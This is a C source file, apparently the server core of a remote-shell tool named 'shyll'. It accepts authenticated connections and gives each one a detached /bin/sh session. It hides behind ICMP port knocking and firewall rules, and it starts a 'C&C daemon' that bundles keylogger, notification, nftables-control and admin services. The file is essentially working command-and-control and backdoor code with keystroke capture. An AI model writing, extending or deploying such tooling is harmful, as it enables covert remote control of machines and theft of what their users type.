#include "server.h"

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <stdio.h>
#include <netinet/ip_icmp.h>
#include <memory.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <asm-generic/errno-base.h>
#include <bits/fcntl-linux.h>
#include <sys/param.h>
#include <sys/file.h>

#include "admin_service.h"
#include "cncdaemon.h"
#include "stream.h"
#include "stream_exec.h"
#include "keylog_service.h"
#include "notify_service.h"
#include "nftables_control_service.h"
#include "nftables.h"

#define MAX_ENDPOINT_ARGS 64
#define MAX_CONCURRENT_CONNECTIONS 256
#define MAX_STDIN_INIT_STEPS 5

static const char* INSTANCE_LOCK_FILE = "/var/run/shyll_server_instance.lock";

struct allocated_id_entry {
    pid_t pid;
    unsigned short id;
};

struct endpoint_startup_args {
    char* path;
    char* args[MAX_ENDPOINT_ARGS];
    struct stdin_initialization_step init_stdin_steps[MAX_STDIN_INIT_STEPS];
    const char* env[MAX_ENDPOINT_ARGS];
};

static struct allocated_id_entry allocated_ids[MAX_CONCURRENT_CONNECTIONS] = {0};

int allow_id_allocation(const unsigned short id) {
    int any_empty = 0;

    for (unsigned int i = 0; i < sizeof(allocated_ids) / sizeof(struct allocated_id_entry); i++) {
        if (!allocated_ids[i].pid) {
            any_empty = 1;
            continue;
        }

        int pid_exists = kill(allocated_ids[i].pid, 0) == 0;

        if (pid_exists) {
            if (allocated_ids[i].id == id)
                return 0;
        } else {
            memset(&allocated_ids[i], 0, sizeof(struct allocated_id_entry));
            any_empty = 1;
        }
    }

    return any_empty ? 1 : 0;
}

int allocate_id(const pid_t pid, const unsigned short id) {
    unsigned int free_idx = 0;
    for (; free_idx < sizeof(allocated_ids) / sizeof(struct allocated_id_entry); free_idx++) {
        if (!allocated_ids[free_idx].pid) {
            break;
        }

        int pid_exists = kill(allocated_ids[free_idx].pid, 0) == 0;

        if (!pid_exists)
            break;
    }

    if (free_idx >= sizeof(allocated_ids) / sizeof(struct allocated_id_entry))
        return 0;

    allocated_ids[free_idx].pid = pid;
    allocated_ids[free_idx].id = id;

    return 1;
}

void configure_startup_arguments(struct endpoint_startup_args* args, const char* command_pipe_input_var, const char* command_pipe_output_var) {
    args->init_stdin_steps[0].stdin = 0;

    args->path = "/bin/sh";
    args->args[0] = "sh";
    args->args[1] = 0;
    args->env[0] = 0;

    if (!command_pipe_input_var || !command_pipe_output_var)
        return;

    args->env[0] = command_pipe_input_var;
    args->env[1] = command_pipe_output_var;
    args->env[2] = "TERM=xterm";
    args->env[3] = 0;


    args->init_stdin_steps[0].stdin = CNC_DAEMON_SHELL_INTERFACE_FUNCTION_DEFINITIONS;
    args->init_stdin_steps[0].discard_output = 1;

    //This gives us back the bash prompt character '#' that we lost due to the initial discard.
    args->init_stdin_steps[1].stdin = "\n";
    args->init_stdin_steps[1].discard_output = 0;

    args->init_stdin_steps[2].stdin = 0;
}

void logic_server(void* _args, struct stream_session_context* session) {
    struct endpoint_startup_args* args = _args;

    stream_fork_exec(
        session,
        args->path, args->args, args->env,
        args->init_stdin_steps
    );

    printf("Stream closing.\n");
}

pid_t spawn_server(const struct encrypt_auth* auth, const struct handshake_established* connection, const struct listener_arguments* arguments, const char* command_pipe_input, const char* command_pipe_output) {
    pid_t child_pid = arguments->fork_connections ? fork() : 0;

    if (child_pid)
        return child_pid;

    setsid();

    //To completely detach, we need to do two fork.

    if (arguments->fork_connections) {
        if (fork() <= 0)
            exit(0);
    }

    printf("Accepted connection!\n");

    struct endpoint_startup_args startup_args;
    char command_pipe_input_envvar[FILENAME_MAX] = {0};
    char command_pipe_output_envvar[FILENAME_MAX] = {0};

    if (command_pipe_input) {
        snprintf(command_pipe_input_envvar, sizeof(command_pipe_input_envvar), "%s=%s", COMMAND_PIPE_INPUT_ENV_VAR, command_pipe_input);
    }

    if (command_pipe_input) {
        snprintf(command_pipe_output_envvar, sizeof(command_pipe_output_envvar), "%s=%s", COMMAND_PIPE_OUTPUT_ENV_VAR, command_pipe_output);
    }

    configure_startup_arguments(&startup_args, command_pipe_input_envvar, command_pipe_output_envvar);

    stream_start(auth, connection, logic_server, !arguments->heartbeat, &startup_args);

    exit(0);
}

void listen_loop(void* _arguments, const struct cncdaemon_session_context* cncdaemon_session) {
    struct listener_arguments* arguments = _arguments;

    printf("Listening for new connections...\n");
    while (1) {
        struct handshake_established connection;
        if (!handshake_listen(&arguments->auth, 0, allow_id_allocation, &connection)) {
            fprintf(stderr, "Error completing listen operation. Re-attempting.");
            continue;
        }

        pid_t child = spawn_server(
            &arguments->auth,
            &connection,
            arguments,
            cncdaemon_session ? cncdaemon_session->command_input_pipe : NULL,
            cncdaemon_session ? cncdaemon_session->command_output_pipe : NULL);

        allocate_id(child, connection.established_id);
    }
}

static int ensure_single_instance()
{
    int lockfile = open(INSTANCE_LOCK_FILE, O_CREAT | O_WRONLY);

    if (lockfile == -1) {
        if (errno == EACCES) {
            fprintf(stderr, "Error, cannot access lock file. Are you running shyll as root.\n");
        } else {
            fprintf(stderr, "Error, unable to open lock file.\n");
        }
        return -1;
    }

    if (flock(lockfile, LOCK_EX | LOCK_NB) == -1)
    {
        fprintf(stderr, "Error, another shyll listener instance is already running on this machine. Terminate first before starting another one.\n");
        close(lockfile);
        return -1;
    }

    //We do not want forked processes to inherit this lock.
    int flags = fcntl(lockfile, F_GETFD);
    flags |= FD_CLOEXEC;
    fcntl(lockfile, F_SETFD, flags);

    return lockfile;
}

int add_icmp_block_firewall_rule(int* rule_handle_buffer) {
    if (system("nft add table ip filter") != 0) {
        fprintf(stderr, "Error adding table \"ip filter\"");
        return 0;
    }

    if (system("nft add chain ip filter INPUT") != 0) {
        fprintf(stderr, "Error adding chain \"INPUT\"");
        return 0;
    }

    FILE* r = popen("nft --handle --echo add rule ip filter INPUT icmp type echo-request drop", "r");

    if (!r)
        return 0;

    char line_buffer[4096];
    while (fgets(line_buffer, sizeof(line_buffer), r)) {
        const char* token = "# handle ";
        char* handle_idx = strstr(line_buffer, token);
        if (!handle_idx)
            continue;

        *rule_handle_buffer = strtol(handle_idx + strlen(token), NULL, 10);
    }

    //Read all of the output contents to prevent a deadlock
    while (fgets(line_buffer, sizeof(line_buffer), r)) {}

    if (pclose(r) < 0) {
        fprintf(stderr, "Error, rule add command exited with status\n");
        return 0;
    }

    return 1;
}

void setup_nft_knock_restriction() {
    struct nft_rule rules[1];
    int rule_count = nft_query_icmp_echo_rules(rules, 1);

    if (rule_count == 0) {
        printf("NOTE! No existing NFTables rules were found related to ICMP traffic.\n"
            "This means that the shyll server is not protected from being accessed\n"
            "via the firewall and consequently, the port-knocking security feature\n"
            "is not effective.\n\n");
    } else {
        printf("Existing NFTables rules for ICMP traffic was found on the machine.\n\n");
    }

    char response_buffer[1024];

    int configure_new_rule = 0;
    while (1) {
        printf("Would you like to add a new NFTables rule to block incoming ICMP Echo requests? (yes/no): ");

        char* response = fgets(response_buffer, sizeof(response_buffer), stdin);
        if (!response)
            break;

        while (isspace(*response))
            response++;

        if (strlen(response) == 0)
            continue;

        for (char* p = response + strlen(response) - 1; p >= response && isspace(*p); p--) {
            *p = 0;
        }

        for (char* p = response; *p; p++)
            *p = (char)tolower(*p);

        if (strcmp(response, "y") == 0 || strcmp(response, "yes") == 0) {
            configure_new_rule = 1;
            break;

        } else if (strcmp(response, "n") == 0 || strcmp(response, "no") == 0) {
            configure_new_rule = 0;
            break;
        } else {
            printf("Unrecognized respones \"%s\"; please try again...\n", response);
        }
    }

    if (configure_new_rule) {
        int rule_handle = 0;
        int success = add_icmp_block_firewall_rule(&rule_handle);
        if (success) {
            printf("ICMP Echo block firewall rule added successfully. You can manually remove it later using the following command:\n"
                "\t\"sudo nft delete rule ip filter INPUT handle %d\"\n\n", rule_handle);
        } else {
            fputs("Error adding the ICMP firewall rule. You can add one yourself using the following commands:\n"
                  "\t\"nft add table ip filter\"\n"
                  "\t\"nft add chain ip filter INPUT\"\n"
                  "\t\"nft add rule ip filter INPUT icmp type echo-request drop\"\n"
                  "Continuing execution without adding the rule.\n\n",
                  stderr);
        }

        puts("See NFT Quick Reference guide: https://wiki.nftables.org/wiki-nftables/index.php/Quick_reference-nftables_in_10_minutes\n\n");
    }
}

int run_server(struct listener_arguments* arguments) {
    int instance_lock = ensure_single_instance();

    if (instance_lock < 0)
        return 1;

    setup_nft_knock_restriction();

    puts("Starting the server...\n");

    char daemon_started = 0;

    struct cncdaemon_service keylog;
    struct cncdaemon_service notify;
    struct cncdaemon_service nftables;
    struct cncdaemon_service admin;

    keylogger_startup(&keylog);
    notify_startup(&notify);
    nftables_control_startup(&arguments->auth, arguments->knock_window_length, &nftables);
    admin_startup(&admin);

    struct cncdaemon_service* services[] = {
        &keylog,
        &notify,
        &nftables,
        &admin,
        NULL
    };

    if (arguments->cnc_daemon) {
        printf("Starting the background C&C daemon service...\n");
        if (!cncdaemon_start(listen_loop, arguments, services)) {
            fprintf(stderr, "Error, unable to start C&C daemon service. Daemon service commands will not be available.");
        }

        daemon_started = 1;
    }

    if (!daemon_started)
        listen_loop(arguments, NULL);

    keylogger_shutdown(&keylog);
    notify_shutdown(&notify);
    nftables_control_shutdown(&nftables);
    admin_shutdown(&admin);
    close(instance_lock);
    return 0;
}